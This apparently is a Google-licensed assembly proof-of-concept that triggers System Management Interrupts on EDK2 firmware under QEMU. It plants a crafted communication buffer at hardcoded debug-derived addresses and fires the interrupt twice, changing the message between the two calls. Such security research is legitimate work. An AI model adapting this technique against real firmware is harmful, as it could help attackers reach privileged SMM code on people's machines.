# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

  .globl _start

// $ grep PiSmmIpl edk2debug.log
PiSmmIpl_base = 0x00006AC7000

// $ nm PiSmmIpl.debug | grep mSmmCorePrivateData
mSmmCorePrivateData = 0x0000000000007140
// $ gdb PiSmmIpl.debug -ex 'ptype /o mSmmCorePrivateData' -batch
CommunicationBuffer = 56
BufferSize = 64

BootServices = 96
// $ gdb PiSmmIpl.debug -ex 'ptype /o gBS' -batch
AllocatePool = 64

EfiRuntimeServicesData = 6

_start:
  mov %rsp,%rbp
  and $-16,%rsp

  mov $(PiSmmIpl_base + mSmmCorePrivateData),%r13

  mov $EfiRuntimeServicesData,%rcx
  mov $(buffer_end - buffer),%rdx
  lea buffer_send(%rip),%r8

  mov BootServices(%rbx),%rax
  call *AllocatePool(%rax)
  test %rax,%rax
  jne bad

  lea buffer(%rip),%rsi
  mov buffer_send(%rip),%rdi
  mov $(buffer_end - buffer),%rcx
  rep movsb

  mov buffer_send(%rip),%rax
  movq %rax,CommunicationBuffer(%r13)
  movq $(buffer_end - buffer),BufferSize(%r13)

  xor %eax,%eax
  outb %al,$0xB3
  outb %al,$0xB2

  // Need a jump to guarantee a switch to SMI handler for QEMU
  jmp fin_smi1
fin_smi1:

  mov buffer_send(%rip),%rax
  add $(message - buffer),%rax
  incq (%rax)

  mov buffer_send(%rip),%rax
  movq %rax,CommunicationBuffer(%r13)
  movq $(buffer_end - buffer),BufferSize(%r13)

  xor %eax,%eax
  outb %al,$0xB3
  outb %al,$0xB2

  // Need a jump to guarantee a switch to SMI handler for QEMU
  jmp fin_smi2
fin_smi2:

  ret

bad:
  hlt
  jmp .

buffer_send:
  .quad 0

buffer:
  .long 0x9a75cf12
  .short 0x2c83
  .short 0x4d10
  .byte 0xb5, 0xa8, 0x35, 0x75, 0x54, 0x65, 0x92, 0xf7

  .quad buffer_end - message
message:
  .quad 0x44440000

buffer_end:
